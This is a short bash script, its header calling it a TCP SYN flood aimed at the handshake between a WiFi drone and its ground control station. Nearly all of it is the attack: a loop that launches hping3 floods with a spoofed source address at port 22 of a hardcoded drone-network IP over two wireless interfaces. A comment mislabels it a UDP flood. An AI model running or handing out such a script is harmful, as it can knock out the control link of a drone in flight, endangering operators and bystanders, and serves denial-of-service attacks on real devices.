#This is a TCP SYN Flood attack designed to exploit the TCP protocol used in the handshake between a WiFi drone and its GCS

#/bin/bash


#udp_flood script

#define variables

interface="wlan1"
interface2="wlan2"
ip_add="192.168.42.59"
defaultgw="192.168.42.1"

#executable names
ifconfig="ifconfig"
iwconfig="iwconfig"
airmon="airmon-ng"
hping="hping3"
term="lxterminal"

#associative arrays
declare -A essid

i=0

while [ $i -le 2 ]
do
	$term -e sudo $hping -a $ip_add -S --flood -p 22 -d 64 $ip_add -I $interface
	$term -e sudo $hping -a $ip_add -S --flood -p 22 -d 64 $ip_add -I $interface2
	((i++))
done 
